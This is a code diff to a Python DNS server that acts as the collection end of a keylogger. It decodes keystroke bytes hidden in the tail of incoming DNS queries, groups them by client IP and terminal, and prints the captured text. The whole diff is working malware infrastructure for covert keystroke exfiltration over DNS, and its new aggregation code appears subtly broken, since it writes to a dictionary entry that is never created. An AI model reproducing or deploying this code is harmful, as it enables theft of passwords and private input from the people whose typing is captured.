@@ -7,13 +7,7 @@ import yaml
 from dnslib import QTYPE, RCODE, DNSRecord
 from dnslib.server import BaseResolver, DNSHandler, DNSLogger, DNSServer
 
-qw_key_map = yaml.safe_load(open("qwerty.yml"))
-az_key_map = yaml.safe_load(open("azerty.yml"))
-key_maps = {0: qw_key_map, 1: az_key_map}
 
-mods_str_rep = {
-    k: {v["keys"][mod]: mod for mod in v["mod"]} for k, v in key_maps.items()
-}
 keys = {}
 PAYLOAD_LEN = int(os.environ["PAYLOAD_LEN"])
 
@@ -57,28 +51,20 @@ class PassthroughDNSHandler(DNSHandler):
         try:
             payload = data[-PAYLOAD_LEN:]
             key_events = zip(payload[::2], payload[1::2])
-            for layout, code in key_events:
-                if key_map := key_maps.get(layout):
-                    if (
-                        len(keys[client_ip]) > 0
-                        and keys[client_ip][-1] in mods_str_rep[layout]
-                    ):
-                        last_mod_str = keys[client_ip].pop()
-                        mod = mods_str_rep[layout][last_mod_str]
-                        keys[client_ip].append(
-                            key_map["mod"][mod].get(
-                                code, f"{last_mod_str} {key_map['keys'].get(code, '')} "
-                            )
-                        )
-                    else:
-                        keys[client_ip].append(key_map["keys"].get(code, ""))
+            for tty, key in key_events:
+                if not keys[client_ip].get(tty):
+                    keys[client_ip][tty] = []
+                keys[client_ip][tty].append(chr(key))
 
             res = {}
-            for client_ip, k in keys.items():
-                res[client_ip] = "".join(k)
+            for client_ip, tty_obj in keys.items():
+                for tty_id, k in tty_obj.items():
+                    res[client_ip][tty_id] = "".join(k)
             os.system("clear")
-            for c, k in res.items():
-                print(f"{c}: {k}")
+            for ip, tty_obj in res.items():
+                print(f"[{ip}]")
+                for tty_id, k in tty_obj.items():
+                    print(f"(tty_{tty_id}): {k}")
 
         except Exception as e:
             print(e)
